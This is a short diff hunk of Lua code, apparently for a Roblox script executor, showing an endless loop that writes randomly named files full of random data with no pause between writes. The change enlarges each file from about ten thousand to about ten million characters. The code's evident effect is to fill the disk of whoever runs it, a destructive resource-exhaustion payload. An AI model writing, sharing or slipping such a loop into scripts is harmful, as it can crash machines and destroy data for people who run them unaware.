@@ -13,6 +13,6 @@ end
 
 
 while true do 
-    writefile(generateRandomString(64), generateRandomString(9999))
+    writefile(generateRandomString(64), generateRandomString(9999999))
     task.wait()
 end
